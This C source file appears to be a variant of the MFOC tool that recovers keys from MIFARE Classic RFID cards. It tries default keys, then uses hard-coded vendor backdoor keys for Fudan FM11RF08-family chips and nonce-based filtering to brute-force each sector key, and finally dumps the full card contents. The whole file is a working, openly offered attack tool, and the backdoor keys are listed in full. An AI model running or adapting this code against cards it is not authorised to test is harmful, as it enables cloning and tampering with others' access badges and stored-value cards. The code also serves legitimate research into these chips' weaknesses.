/*-
 * Mifare Classic Offline Cracker
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 *
 * Contact: <mifare@nethemba.com>
 *
 * Porting to libnfc 1.3.3: Michal Boska <boska.michal@gmail.com>
 * Porting to libnfc 1.3.9 and upper: Romuald Conty <romuald@libnfc.org>
 *
 */

/*
 * This implementation was written based on information provided by the
 * following documents:
 *
 * http://eprint.iacr.org/2009/137.pdf
 * http://www.sos.cs.ru.nl/applications/rfid/2008-esorics.pdf
 * http://www.cosic.esat.kuleuven.be/rfidsec09/Papers/mifare_courtois_rfidsec09.pdf
 * http://www.cs.ru.nl/~petervr/papers/grvw_2009_pickpocket.pdf
 */

#define _XOPEN_SOURCE 1 // To enable getopt

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include "../config.h"

// NFC
#include <nfc/nfc.h>

// Crapto1
#include "crapto1.h"

// Internal
#include "mfoc.h"
#include "nfc-utils.h"
#include "staticnested.h"


const nfc_modulation nm =
{ 
    .nmt = NMT_ISO14443A,
    .nbr = NBR_106
};

nfc_context *ctx = NULL;
nfc_device *pdi = NULL;
nfc_target *pnt = NULL;


int main(
    int argc,
    char *const argv[])
{
    // Register cleanup
    atexit(mf_destroy);

    FILE *fp_out = NULL;

    uint64_t *test_keys = NULL;
    size_t test_keys_len = 0;

    uint64_t *backdoor_keys = NULL;
    size_t backdoor_keys_len = 0;

    for (;;)
    {
        int ch = getopt(argc, argv, "hf:g:o:");
        if (ch == -1)
            break;

        switch (ch)
        {
            case 'f':
            case 'g':
                FILE *fp_in = fopen(optarg, "r");
                if (fp_in == NULL)
                {
                    fprintf(stderr, "Cannot open keyfile: %s, exiting\n", optarg);
                    exit(EXIT_FAILURE);
                }

                uint64_t **keys = ch == 'f' ? &test_keys : &backdoor_keys;
                size_t *keys_len = ch == 'f' ? &test_keys_len : &backdoor_keys_len;

                char line[16];
                while (fgets(line, sizeof(line), fp_in) != NULL)
                {
                    uint64_t key = strtoll(line, NULL, 16);
                    if (key != 0x00)
                        add_key(key, keys, keys_len);
                }

                fclose(fp_in);
                break;

            case 'o':
                fp_out = fopen(optarg, "wb");
                if (fp_out == NULL)
                {
                    fprintf(stderr, "Cannot open output file %s, exiting\n", optarg);
                    exit(EXIT_FAILURE);
                }
                break;

            case 'h':
            default:
                fprintf(stdout, "Usage: mfoc-backdoor [-h] [-f file] [-g file] [-o output]\n");
                fprintf(stdout, "  h     print this help and exit\n");
                fprintf(stdout, "  f     parses a file of keys to add in addition to the default test keys\n");
                fprintf(stdout, "  g     parses a file of keys to add in addition to the default backdoor keys\n");
                fprintf(stdout, "  o     file in which the card contents will be written\n");
                exit(EXIT_SUCCESS);
        }
    }

    uint64_t default_test_keys[] =
    {
        0xFFFFFFFFFFFF, // Default key (first key used by program if no user defined key)
        0x000000000000, // Blank key
        0xA0A1A2A3A4A5, // NFCForum MAD key
        0xD3F7D3F7D3F7, // NFCForum content key
        0xB0B1B2B3B4B5,
        0x4D3A99C351DD,
        0x1A982C7E459A,
        0xAABBCCDDEEFF,
        0x714C5C886E97,
        0x587EE5F9350F,
        0xA0478CC39091,
        0x533CB6C723F6,
        0x8FD0A4F256E9
    };

    // Populate test_keys
    for (size_t i = 0; i < sizeof(default_test_keys) / sizeof(uint64_t); i++)
        add_key(default_test_keys[i], &test_keys, &test_keys_len);

    uint64_t default_backdoor_keys[] =
    {
        0xA396EFA4E24F, // FM11RF08S xx90
        0xA31667A8CEC1, // FM11RF08
        0x518B3354E760, // FM11RF32N 4K
        0x73B9836CF168  // Another 4K?
    };

    // Populate backdoor_keys
    for (size_t i = 0; i < sizeof(default_backdoor_keys) / sizeof(uint64_t); i++)
        add_key(default_backdoor_keys[i], &backdoor_keys, &backdoor_keys_len);

   	// Initialize reader/tag structures
    mf_init();
    mf_configure();

    // Select tag
    mf_select_target();

   	// Test if a compatible MIFARE tag is used
    if ((pnt->nti.nai.btSak & 0x08) == 0 && pnt->nti.nai.btSak != 0x01)
    {
        fprintf(stderr, "Only Mifare Classic is supported\n");
        exit(EXIT_FAILURE);
    }

    uint8_t num_sectors;
    struct mf_sector sectors[NR_TRAILERS_4k] = {{ 0 }};

   	// Get Mifare Classic type from SAK
   	// see http://www.nxp.com/documents/application_note/AN10833.pdf Section 3.2
    switch (pnt->nti.nai.btSak)
    {
        case 0x01:
        case 0x08:
        case 0x88:
        case 0x28:
        // case 0x19:   // Weird MFC 2k SAK
            if (mf_rats_is_2k())
            {
                fprintf(stdout, "Found Mifare Plus 2k tag\n\n");
                num_sectors = NR_TRAILERS_2k;
            }
            else
            {
                fprintf(stdout, "Found Mifare Classic 1k tag\n\n");
                num_sectors = NR_TRAILERS_1k;
            }
            break;
        case 0x09:
            fprintf(stdout, "Found Mifare Classic Mini tag\n\n");
            num_sectors = NR_TRAILERS_MINI;
            break;
        case 0x18:
        // case 0x20:   // Weird ISO14443-4 SAK
            fprintf(stdout, "Found Mifare Classic 4k tag\n\n");
            num_sectors = NR_TRAILERS_4k;
            break;
        default:
            fprintf(stderr, "Cannot determine card type from SAK\n");
            exit(EXIT_FAILURE);
    }

    print_nfc_target(pnt, true);
    fprintf(stdout, "\n\n");

    // Save uid
    const uint32_t auth_uid = bytes_to_num(pnt->nti.nai.abtUid + pnt->nti.nai.szUidLen - 4, 4);

    // Test all keys provided
    // todo - check for duplicates in found/unknown key list (do we care? will not be huge overhead)
    // todo - make code more modular! :)
    fprintf(stdout, "Try to authenticate to all sectors with %zu keys...\n", test_keys_len);
    fprintf(stdout, "Symbols: '.' no key found, '/' A key found, '\\' B key found, 'X' both keys found\n\n");

    uint8_t test_found_cnt = 0;

    for (size_t i = 0; i < test_keys_len; i++)
    {
        fprintf(stdout, "\rKey: %012llX -> ", test_keys[i]);
        fflush(stdout);

       	// Iterate over every sector
       	for (uint8_t s = 0; s < num_sectors; s++)
        {
            if (!sectors[s].found_key_a)
            {
                // Key A
                bool auth_success = mf_auth(MC_AUTH_A, sector_to_trailer(s), test_keys[i], auth_uid);
                if (auth_success)
                {
                    sectors[s].found_key_a = true;
                    sectors[s].key_a = test_keys[i];

                    if (!sectors[s].found_key_b)
                    {
                        uint8_t block[16];

                        // Although KeyA can never be directly read from the data sector, KeyB can, so
                        // if we need KeyB for this sector, it should be revealed by a data read with KeyA
                        bool read_success = mf_read(sector_to_trailer(s), block);
                        if (read_success)
                        {
                            uint64_t read_key = bytes_to_num(block + 10, 6);

                            bool auth_success = mf_auth(MC_AUTH_B, sector_to_trailer(s), read_key, auth_uid);
                            if (auth_success)
                            {
                                sectors[s].found_key_b = true;
                                sectors[s].key_b = read_key;
                            }
                        }
                    }
                }
            }

            if (!sectors[s].found_key_b)
            {
                // Key B
                bool auth_success = mf_auth(MC_AUTH_B, sector_to_trailer(s), test_keys[i], auth_uid);
                if (auth_success)
                {
                    sectors[s].found_key_b = true;
                    sectors[s].key_b = test_keys[i];
                }
            }

            if (sectors[s].found_key_a && sectors[s].found_key_b)
            {
                fprintf(stdout, "X");
                if (++test_found_cnt == num_sectors)
                    break;
            }
            else if (sectors[s].found_key_a)
                fprintf(stdout, "/");
            else if (sectors[s].found_key_b)
                fprintf(stdout, "\\");
            else
                fprintf(stdout, ".");

            fflush(stdout);
        }
    }

    fprintf(stdout, "\n\n");
    free(test_keys);

    if (test_found_cnt == num_sectors)
    {
        fprintf(stdout, "We have all sectors encrypted with the default keys.\n\n");
        goto dump_card;
    }

    // Test all backdoor keys
    fprintf(stdout, "Try to authenticate with %zu backdoor keys...\n", backdoor_keys_len);
    fprintf(stdout, "Symbols: 'X' success, '.' failure\n\n");

    // Anticollision to send raw frames
    mf_select_target();

    uint64_t backdoor_key = 0x00;

    for (size_t i = 0; i < backdoor_keys_len; i++)
    {
        fprintf(stdout, "\rKey: %012llX -> ", backdoor_keys[i]);
        fflush(stdout);

        // Advanced verification at sector 0
        bool auth_success = mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A, sector_to_trailer(0), backdoor_keys[i], auth_uid, NULL, false);
        if (auth_success)
        {
            backdoor_key = backdoor_keys[i];
            fprintf(stdout, "X");
            break;
        }
        else
            fprintf(stdout, ".");

        fflush(stdout);
    }

    fprintf(stdout, "\n\n");
    free(backdoor_keys);

    if (backdoor_key == 0x00)
    {
        fprintf(stdout, "Card is not vulnerable to backdoor attacks.\n\n");
        goto dump_card;
    }

    // Collect nonces and keystreams
    fprintf(stdout, "Collecting key nonces using the backdoor command...\n\n");

    for (uint8_t s = 0; s < num_sectors; s++)
    {
        if (sectors[s].found_key_a && sectors[s].found_key_b)
            continue;

        // Save nonces for both key A/B
        uint64_t nt, nt_enc;
        bool auth_success, auth_enc_success;

        auth_success = mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A + 4, sector_to_trailer(s), backdoor_key, auth_uid, &nt, true);
        auth_enc_success = mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A, sector_to_trailer(s), backdoor_key, auth_uid, &nt_enc, false);
        if (!auth_success || !auth_enc_success)
        {
            fprintf(stdout, "Failed to authenticate sector %02d, key A using backdoor command\n", s);
            exit(EXIT_FAILURE);
        }

        // Discard parity bit
        sectors[s].nt_a = nt >> 1;
        // Extract keystream
        sectors[s].keystr_a = nt_enc ^ nt;

        auth_success = mf_nested_auth(MC_AUTH_B + 4, MC_AUTH_B + 4, sector_to_trailer(s), backdoor_key, auth_uid, &nt, true);
        auth_enc_success = mf_nested_auth(MC_AUTH_B + 4, MC_AUTH_B, sector_to_trailer(s), backdoor_key, auth_uid, &nt_enc, false);
        if (!auth_success || !auth_enc_success)
        {
            fprintf(stdout, "Failed to authenticate sector %02d, key B using backdoor command\n", s);
            exit(EXIT_FAILURE);
        }

        sectors[s].nt_b = nt >> 1;
        sectors[s].keystr_b = nt_enc ^ nt;
    }

    // Initialize table for comparing LFSR states
    init_lfsr16_table();

    // Now recover keys
    fprintf(stdout, "Try to recover all unknown keys...\n\n");

    for (uint8_t s = 0; s < num_sectors; s++)
    {
        uint64_t *recovery_keys_a = NULL;
        size_t recovery_keys_a_len = 0;

        // Generate candidates
        if (!sectors[s].found_key_a)
            generate_keys(sectors[s].nt_a, sectors[s].keystr_a, auth_uid, &recovery_keys_a, &recovery_keys_a_len);
        else
        {
            recovery_keys_a = &sectors[s].key_a;
            recovery_keys_a_len = 1;
        }

        uint64_t *recovery_keys_b = NULL;
        size_t recovery_keys_b_len = 0;

        if (!sectors[s].found_key_b)
            generate_keys(sectors[s].nt_b, sectors[s].keystr_b, auth_uid, &recovery_keys_b, &recovery_keys_b_len);
        else
        {
            recovery_keys_b = &sectors[s].key_b;
            recovery_keys_b_len = 1;
        }

        uint8_t lfsr16_common[0x10000] = { 0 };

        // Filter keys based on nonce generation in Fudan tags
        for (size_t i = 0; i < recovery_keys_b_len; i++)
        {
            uint16_t seed = compute_seednt16_nt32(sectors[s].nt_b, recovery_keys_b[i]);
            lfsr16_common[seed] |= 0b01;

            // Store in top 16 bits
            recovery_keys_b[i] |= (uint64_t) seed << 48;
        }

        for (size_t l = 0, i = 0; i < recovery_keys_a_len; i++)
        {
            uint16_t seed = compute_seednt16_nt32(sectors[s].nt_a, recovery_keys_a[i]);
            lfsr16_common[seed] |= 0b10;

            if (lfsr16_common[seed] & 0b01)
            {
                uint64_t tmp = recovery_keys_a[i];
                recovery_keys_a[i] = recovery_keys_a[l];
                recovery_keys_a[l++] = tmp;
            }
        }

        for (size_t l = 0, i = 0; i < recovery_keys_b_len; i++)
        {
            uint16_t seed = recovery_keys_b[i] >> 48;

            if (lfsr16_common[seed] & 0b10)
            {
                uint64_t tmp = recovery_keys_b[i];
                recovery_keys_b[i] = recovery_keys_b[l];
                recovery_keys_b[l++] = tmp;
            }
        }

        // Bruteforce
        if (!sectors[s].found_key_a)
        {
            for (size_t i = 0; i < recovery_keys_a_len; i++)
            {
                fprintf(stdout, "\rBruteforcing sector %02d, key A : %8zu / %8zu ", s, i + 1, recovery_keys_a_len);
                fflush(stdout);

                bool auth_success = mf_auth(MC_AUTH_A, sector_to_trailer(s), recovery_keys_a[i], auth_uid);
                if (auth_success)
                {
                    sectors[s].found_key_a = true;
                    sectors[s].key_a = recovery_keys_a[i];

                    if (!sectors[s].found_key_b)
                    {
                        uint8_t block[16];

                        // Try again to read key B
                        bool read_success = mf_read(sector_to_trailer(s), block);
                        if (read_success)
                        {
                            uint64_t read_key = bytes_to_num(block + 10, 6);

                            bool auth_success = mf_auth(MC_AUTH_B, sector_to_trailer(s), read_key, auth_uid);
                            if (auth_success)
                            {
                                sectors[s].found_key_b = true;
                                sectors[s].key_b = read_key;
                                break;
                            }
                        }

                        // Filter again
                        uint16_t seed_a = compute_seednt16_nt32(sectors[s].nt_a, sectors[s].key_a);
                        for (size_t l = 0, j = 0; j < recovery_keys_b_len; j++)
                        {
                            uint16_t seed_b = recovery_keys_b[j] >> 48;

                            if (seed_a == seed_b)
                            {
                                uint64_t tmp = recovery_keys_b[j];
                                recovery_keys_b[j] = recovery_keys_b[l];
                                recovery_keys_b[l++] = tmp;
                            }
                        }
                    }

                    break;
                }
            }

            fprintf(stdout, "... Done\n");
            free(recovery_keys_a);
        }

        if (!sectors[s].found_key_b)
        {
            for (size_t i = 0; i < recovery_keys_b_len; i++)
            {
                fprintf(stdout, "\rBruteforcing sector %02d, key B : %8zu / %8zu ", s, i + 1, recovery_keys_b_len);
                fflush(stdout);

                bool auth_success = mf_auth(MC_AUTH_B, sector_to_trailer(s), recovery_keys_b[i], auth_uid);
                if (auth_success)
                {
                    sectors[s].found_key_b = true;
                    sectors[s].key_b = recovery_keys_b[i];
                    break;
                }
            }

            fprintf(stdout, "... Done\n");
            free(recovery_keys_b);
        }

        // Clear the top 16 bits
        sectors[s].key_b &= 0xFFFFFFFFFFFF;
    }

    fprintf(stdout, "\n");

dump_card:
    // Finally dump
    for (uint8_t s = 0; s < num_sectors; s++)
    {
        fprintf(stdout, "Sector %02d - ", s);

        if (sectors[s].found_key_a)
            fprintf(stdout, "Found   Key A: %012llX ", sectors[s].key_a);
        else
            fprintf(stdout, "Unknown Key A               ");

        if (sectors[s].found_key_b)
            fprintf(stdout, "Found   Key B: %012llX \n", sectors[s].key_b);
        else
            fprintf(stdout, "Unknown Key B               \n");
    }

    fprintf(stdout, "\nDumping all card contents... (Unknown = 0)\n\n");

    for (uint8_t s = 0; s < num_sectors; s++)
    {
        bool auth_success = false;

        // Authenticate trailer block
        if (sectors[s].found_key_a)
        {
            auth_success = mf_auth(MC_AUTH_A, sector_to_trailer(s), sectors[s].key_a, auth_uid);
            if (!auth_success)
            {
                fprintf(stderr, "Authentication with key A to a known sector %02d failed?\n", s);
                exit(EXIT_FAILURE);
            }
        }
        else if (sectors[s].found_key_b)
        {
            auth_success = mf_auth(MC_AUTH_B, sector_to_trailer(s), sectors[s].key_b, auth_uid);
            if (!auth_success)
            {
                fprintf(stderr, "Authentication with key B to a known sector %02d failed?\n", s);
                exit(EXIT_FAILURE);
            }
        }

        // Now read all blocks in sector
        for (uint8_t i = s ? (sector_to_trailer(s - 1) + 1) : 0; i <= sector_to_trailer(s); i++)
        {
            uint8_t block[16] = { 0 };

            if (auth_success)
                mf_read(i, block);

            // Copy keys into trailer blocks
            if (i == sector_to_trailer(s))
            {
                num_to_bytes(block, sectors[s].key_a, 6);
                num_to_bytes(block + 10, sectors[s].key_b, 6);
            }

            fprintf(stdout, "Block %03d: ", i);
            for (size_t u = 0; u < sizeof(block); u++)
                fprintf(stdout, "%02X ", block[u]);
            fprintf(stdout, "\n");

            if (fp_out != NULL)
            {
                size_t res = fwrite(block, sizeof(uint8_t), sizeof(block), fp_out);
                if (res != sizeof(block))
                {
                    fprintf(stderr, "Error, cannot write dump\n", i);
                    exit(EXIT_FAILURE);
                }
            }
        }
    }

    if (fp_out != NULL)
        fclose(fp_out);

    exit(EXIT_SUCCESS);
}

void num_to_bytes(
    uint8_t *dest,
    uint64_t n,
    uint32_t len)
{
    while (len--)
    {
        dest[len] = (uint8_t) n;
        n >>= 8;
    }
}

uint64_t bytes_to_num(
    uint8_t *src,
    uint32_t len)
{
    uint64_t num = 0;

    while (len--)
    {
        num = (num << 8) | (*src);
        src++;
    }

    return num;
}

uint8_t sector_to_trailer(
    uint8_t sector)
{
    return sector < 32 ? (sector * 4 + 3) : (sector * 16 + 143);
}

void mf_init(void)
{
   	// Connect to the first NFC device
    nfc_init(&ctx);
    if (ctx == NULL)
    {
        fprintf(stderr, "Unable to init libnfc (malloc)\n");
        exit(EXIT_FAILURE);
    }

    pdi = nfc_open(ctx, NULL);
    if (pdi == NULL)
    {
        fprintf(stderr, "No NFC device found.\n");
        exit(EXIT_FAILURE);
    }

    pnt = malloc(sizeof(nfc_target));
    if (pnt == NULL)
    {
        fprintf(stderr, "Failed to allocate nfc_target\n");
        exit(EXIT_FAILURE);
    }
}

void mf_destroy(void)
{
   	// Reap and exit
    free(pnt);
    if (pdi != NULL)
        nfc_close(pdi);
    if (ctx != NULL)
        nfc_exit(ctx);
}

void mf_configure(void)
{
    //  * - Crc is handled by the device (NP_HANDLE_CRC = true)
    //  * - Parity is handled the device (NP_HANDLE_PARITY = true)
    //  * - Cryto1 cipher is disabled (NP_ACTIVATE_CRYPTO1 = false)
    //  * - Easy framing is enabled (NP_EASY_FRAMING = true)
    //  * - Auto-switching in ISO14443-4 mode is enabled (NP_AUTO_ISO14443_4 = true)
    //  * - Invalid frames are not accepted (NP_ACCEPT_INVALID_FRAMES = false)
    //  * - Multiple frames are not accepted (NP_ACCEPT_MULTIPLE_FRAMES = false)
    //  * - 14443-A mode is activated (NP_FORCE_ISO14443_A = true)
    //  * - speed is set to 106 kbps (NP_FORCE_SPEED_106 = true)
    //  * - Let the device try forever to find a target (NP_INFINITE_SELECT = true)

    if (nfc_initiator_init(pdi) < 0)
    {
        nfc_perror(pdi, "nfc_initiator_init");
        exit(EXIT_FAILURE);
    }

   	// Let the reader only try once to find a tag
    mf_device_set(NP_INFINITE_SELECT, false);

   	// Disable ISO14443-4 switching in order to read devices that
   	// emulate Mifare Classic with ISO14443-4 compliance.
    mf_device_set(NP_AUTO_ISO14443_4, false);
}

void mf_select_target(void)
{
    int tag_count = nfc_initiator_select_passive_target(pdi, nm, NULL, 0, pnt);
    if (tag_count == 0)
    {
        fprintf(stderr, "No tag found.\n");
        exit(EXIT_FAILURE);
    }
    if (tag_count < 0)
    {
        nfc_perror(pdi, "nfc_initiator_select_passive_target");
        exit(EXIT_FAILURE);
    }
}

void mf_device_set(
    nfc_property property,
    bool enable)
{
    if (nfc_device_set_property_bool(pdi, property, enable) < 0)
    {
        nfc_perror(pdi, "nfc_device_set_property_bool");
        exit(EXIT_FAILURE);
    }
}

bool mf_rats_is_2k(void)
{
    uint8_t abt_cmd[] = { 0xE0, 0x50 };
    uint8_t abt_res[MAX_FRAME_LEN];

    // Use raw send/receive methods
    mf_device_set(NP_EASY_FRAMING, false);

    int res = nfc_initiator_transceive_bytes(pdi, abt_cmd, sizeof(abt_cmd), abt_res, sizeof(abt_res), 0);
    if (res > 0)
    {
       	// ISO14443-4 card, turn RF field off/on to access ISO14443-3 again
        mf_device_set(NP_ACTIVATE_FIELD, false);
        mf_device_set(NP_ACTIVATE_FIELD, true);
    }

    mf_device_set(NP_EASY_FRAMING, true);

   	// Reselect tag
   	mf_select_target();

    if (res >= 10)
    {
        fprintf(stdout, "ATS %02X%02X%02X%02X%02X|%02X%02X%02X%02X%02X\n",
                   res, abt_res[0], abt_res[1], abt_res[2], abt_res[3], 
            abt_res[4], abt_res[5], abt_res[6], abt_res[7], abt_res[8]);

        return abt_res[5] == 0xC1
            && abt_res[6] == 0x05
            && abt_res[7] == 0x2F
            && abt_res[8] == 0x2F
            && (pnt->nti.nai.abtAtqa[1] & 0x02) == 0x00;
    }

    return false;
}

bool mf_read(
    uint8_t block,
    uint8_t *dest)
{
    uint8_t abt_cmd[2];
    uint8_t abt_res[MAX_FRAME_LEN];

    // Prepare MC_READ command
    abt_cmd[0] = MC_READ;
    abt_cmd[1] = block;

    int res = nfc_initiator_transceive_bytes(pdi, abt_cmd, sizeof(abt_cmd), abt_res, sizeof(abt_res), 0);
    if (res > 0)
    {
        if (dest != NULL)
            memcpy(dest, abt_res, res);
        return true;
    }
    else if (res == NFC_ERFTRANS)
    {
   	    // Reselect tag
        mf_select_target();
        return false;
    }
    else
    {
        nfc_perror(pdi, "nfc_initiator_mifare_cmd: MC_READ");
        exit(EXIT_FAILURE);
    }
}

bool mf_auth(
    uint8_t cmd,
    uint8_t block,
    uint64_t key,
    uint32_t uid)
{
    uint8_t abt_cmd[12];
    uint8_t abt_res[MAX_FRAME_LEN];

    // Prepare MC_AUTH command
    abt_cmd[0] = cmd;
    abt_cmd[1] = block;
    num_to_bytes(abt_cmd + 2, key, 6);
    num_to_bytes(abt_cmd + 8, uid, 4);

    int res = nfc_initiator_transceive_bytes(pdi, abt_cmd, sizeof(abt_cmd), abt_res, sizeof(abt_res), 0);
    if (res >= 0)
        return true;
    else if (res == NFC_EMFCAUTHFAIL)
    {
        // Reselect tag
        mf_select_target();
        return false;
    }
    else
    {
        nfc_perror(pdi, "nfc_initiator_mifare_cmd: MC_AUTH");
        exit(EXIT_FAILURE);
    }
}

bool mf_nested_auth(
    uint8_t cmd,
    uint8_t cmd_nested,
    uint8_t block,
    uint64_t key,
    uint32_t uid,
    uint64_t *dest,
    bool decrypt)
{
    // TODO: Set NP_HANDLE_PARITY and NP_HANDLE_CRC only once if possible
    uint8_t abt_cmd[8];
    uint8_t abt_res[MAX_FRAME_LEN];
    uint8_t abt_cmd_par[8];
    uint8_t abt_res_par[MAX_FRAME_LEN];

    // We need full control over the CRC
    mf_device_set(NP_HANDLE_CRC, false);

    // Use raw send/receive methods
    mf_device_set(NP_EASY_FRAMING, false);

    // Initiate authentication
    abt_cmd[0] = cmd;
    abt_cmd[1] = block;
    iso14443a_crc_append(abt_cmd, 2);

    int res = nfc_initiator_transceive_bytes(pdi, abt_cmd, 4, abt_res, sizeof(abt_res), 0);

    mf_device_set(NP_EASY_FRAMING, true);

    // Does it respond with Nt?
    if (res != 4)
    {
        // Return CRC control
        mf_device_set(NP_HANDLE_CRC, true);

        // Reselect tag
        mf_select_target();

        return false;
    }

    // Finally we want to send arbitrary parity bits
    mf_device_set(NP_HANDLE_PARITY, false);

    // Save the tag nonce (nt)
    uint32_t nt = bytes_to_num(abt_res, 4);

    struct Crypto1State pcs;

    // Init the cipher with key {0..47} bits
    crypto1_init(&pcs, key);
    // Load (plain) nt^uid into the cipher {48..79} bits
    crypto1_word(&pcs, nt ^ uid, 0);

    // Load in the reader nonce (Nr = 0)
    num_to_bytes(abt_cmd, 0x00, 4);

    // Skip 32 bits in the pseudo random generator
    nt = prng_successor(nt, 32);

    // Generate reader-answer from tag-nonce
    for (size_t i = 4; i < 8; i++)
    {
        nt = prng_successor(nt, 8);
        abt_cmd[i] = nt & 0xFF;
    }

    // Encrypt response
    for (size_t i = 0; i < 8; i++)
    {
        uint8_t b = abt_cmd[i];

        abt_cmd[i] = crypto1_byte(&pcs, 0x00, 0) ^ b;
        abt_cmd_par[i] = filter(pcs.odd) ^ oddparity(b);
    }

    // Transmit reader-answer
    res = nfc_initiator_transceive_bits(pdi, abt_cmd, 64, abt_cmd_par, abt_res, sizeof(abt_res), abt_res_par);

    // Decrypt the tag answer and verify that suc3(nt) is At
    if (res != 32 || (crypto1_word(&pcs, 0x00, 0) ^ bytes_to_num(abt_res, 4)) != prng_successor(nt, 32))
    {
        mf_device_set(NP_HANDLE_CRC, true);
        mf_device_set(NP_HANDLE_PARITY, true);

        mf_select_target();

        return false;
    }

    // nested auth
    abt_cmd[0] = cmd_nested;
    abt_cmd[1] = block;
    iso14443a_crc_append(abt_cmd, 2);

    // Encryption of the Auth command, sending the Auth command
    for (size_t i = 0; i < 4; i++)
    {
        uint8_t b = abt_cmd[i];

        abt_cmd[i] = crypto1_byte(&pcs, 0x00, 0) ^ b;
        abt_cmd_par[i] = filter(pcs.odd) ^ oddparity(b);
    }

    res = nfc_initiator_transceive_bits(pdi, abt_cmd, 32, abt_cmd_par, abt_res, sizeof(abt_res), abt_res_par);
    if (res < 0)
    {
        nfc_perror(pdi, "Error while requesting encrypted tag-nonce");
        exit(EXIT_FAILURE);
    }

    // Save the encrypted nonce ({nt})
    uint32_t nt_enc = bytes_to_num(abt_res, 4);

    if (dest != NULL)
    {
        // 32 bit nonce + 1 parity bit
        if (decrypt)
        {
            crypto1_init(&pcs, key);
            nt_enc ^= crypto1_word(&pcs, nt_enc ^ uid, 1);

            *dest = (uint64_t) nt_enc << 1 | oddparity(nt_enc & 0xFF);
        }
        else
            *dest = (uint64_t) nt_enc << 1 | abt_res_par[3];
    }

    mf_device_set(NP_HANDLE_CRC, true);
    mf_device_set(NP_HANDLE_PARITY, true);

    mf_select_target();

    return true;
}